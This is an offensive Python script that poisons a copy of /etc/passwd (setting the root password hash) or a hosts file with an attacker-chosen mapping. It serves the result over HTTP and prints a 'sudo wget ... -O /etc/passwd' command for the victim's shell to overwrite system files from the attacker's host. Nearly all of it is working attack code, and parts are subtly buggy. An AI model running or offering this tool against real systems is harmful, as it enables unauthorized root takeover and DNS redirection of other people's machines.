#!/usr/bin/env python3
import argparse
import crypt
import http.server
import ipaddress
import os
import socket
import socketserver
import tempfile

import netifaces
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table

console = Console()

if os.geteuid() != 0:
    console.print(
        "[red][!][/red] [bold]root privileges[/bold] are required to execute this script.")


def write_passwd(file: str, password: str) -> None:
    # Poison passwd file
    try:
        with open(file, "r") as f:
            contents = f.readlines()
            for index, line in enumerate(contents):
                if line.startswith("root"):
                    line = line.split(":")
                    line[1] = crypt.crypt(password)
                    contents[index] = ":".join(line)
        with open(file, "w") as f:
            f.writelines(contents)
    except Exception:
        console.print_exception()


def write_hosts(file: str) -> None:
    # Poison hosts file
    try:
        address = Prompt.ask(
            "Enter the IP address to poison", default="127.0.0.1")
        hostname = Prompt.ask(
            "Enter hostname to map with specified IP", default="localhost")

        payload = f"{address} {hostname}"

        with open(file, "r") as f:
            contents = f.readlines()
        for index, line in enumerate(contents):
            if line.startswith(address):
                contents[index] = payload + "\n"
        if not address in contents:
            contents.append(payload + "\n")

        with open(file, "w") as f:
            f.writelines(contents)
    except Exception:
        console.print_exception()


def check_interface(i: str) -> str:
    # Validate interface name
    try:
        host = ipaddress.IPv4Address(i)
    except ipaddress.AddressValueError:
        try:
            host = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']
        except ValueError:
            console.print(
                "[red][!][/red] Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?")
    return host


def tmp_file() -> str:
    # Create a temporary HTTP server location
    serve_path = os.path.join(os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())), "www")
    os.makedirs(serve_path)

    return serve_path


class TCPServer(socketserver.TCPServer):
    # Reuseable TCP server
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)


class Handler(http.server.SimpleHTTPRequestHandler):
    # Custom HTTP handler
    def __init__(self, *args, directory=tmp_file(), **kwargs):
        super().__init__(*args, **kwargs)

    def log_message(self, format, *func_args):
        super().log_message(format, *func_args)

    def log_request(self, format, *func_args):
        super().log_request(format, *func_args)
 

def main() -> None:
    try:
        interface = Prompt.ask(
        "network interface or IP address to host the HTTP server", default="eth0")
        port = int(Prompt.ask("specify alternate port", default="8000"))
        serve_host = check_interface(interface)

        while True:
            file = Prompt.ask("file to poison [cyan](must be a valid file)[/cyan]")
            if os.path.isfile(file):
                break
            console.print("[prompt.invalid]Invalid file")

        payload = Prompt.ask("payload to execute", choices=[
                         "forceroot", "dnspoof"])

        match payload:
            case "forceroot":
                password = Prompt.ask(
                    "password to set for the root user", default="root")
                write_passwd(file, password)

                console.print(f"[green][+][/green] Poisoned [bold]{file}[/bold]")
                console.print(f"[green][?][/green] Execute the following command on the victims shell:\nsudo wget http://{serve_host}:{port}/{file} -O /etc/passwd")
                console.print(f"[green][+][/green] Serving [bold]posioned {file}[/bold] file on :{port}")

            case "dnspoof":
                write_hosts(file)

                console.print(f"[green][+][/green] Poisoned [bold]{file}[/bold]")
                console.print(f"[green][?][/green] Execute the following command on the victims shell:\nsudo wget http://{serve_host}:{port}/{file} -O /etc/hosts")
                console.print(f"[green][+][/green] Serving [bold]posioned {file}[/bold] file on :{port}")

        def serve_http():
            # Serve the HTTP server
            with TCPServer((serve_host, port), Handler) as httpd:
                httpd.serve_forever()
        try:
            serve_http()

        except KeyboardInterrupt:
            console.print(
                "[red][!][/red] Keyboard interrupt. [bold]Exiting . . .[/bold]")

    except Exception:
        console.print_exception()


if __name__ == "__main__":
    main()
